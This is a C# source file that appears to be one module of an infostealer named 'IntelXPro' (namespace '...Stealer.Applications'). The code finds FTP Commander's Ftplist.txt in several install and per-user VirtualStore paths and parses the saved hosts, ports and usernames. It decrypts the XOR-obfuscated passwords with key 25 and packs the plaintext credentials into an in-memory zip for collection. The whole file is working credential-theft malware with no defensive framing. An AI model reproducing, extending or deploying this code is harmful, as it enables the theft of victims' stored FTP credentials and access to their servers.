using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FTPCommander : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string[] obj = new string[5]
            {
            "C:\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt",
            "C:\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
            "C:\\cftp\\Ftplist.txt",
            "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
            "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt"
            };
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "FTPCommander"
            };
            List<string> list = new List<string>();
            string[] array = obj;
            foreach (string text in array)
            {
                if (!File.Exists(text))
                {
                    continue;
                }
                string[] array2 = File.ReadAllLines(text);
                foreach (string text2 in array2)
                {
                    if (string.IsNullOrWhiteSpace(text2))
                    {
                        continue;
                    }
                    string[] array3 = text2.Split(';');
                    if (array3.Length >= 6)
                    {
                        string text3 = array3[1].Split('=')[1];
                        string text4 = array3[2].Split('=')[1];
                        string input = array3[3].Split('=')[1];
                        string text5 = array3[4].Split('=')[1];
                        if (!(array3[5].Split('=')[1] != "0"))
                        {
                            string text6 = Xor.DecryptString(input, 25);
                            list.Add("Url: " + text3 + ":" + (string.IsNullOrEmpty(text4) ? "21" : text4) + "\nUsername: " + text5 + "\nPassword: " + text6 + "\n");
                            string text7 = "FTP Commander\\Hosts.txt";
                            counterApplications.Files.Add(text + " => " + text7);
                        }
                    }
                }
            }
            if (list.Count > 0)
            {
                string text8 = "FTP Commander\\Hosts.txt";
                zip.AddFile(text8, Encoding.UTF8.GetBytes(string.Join("\n", list)));
                counterApplications.Files.Add(text8 ?? "");
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
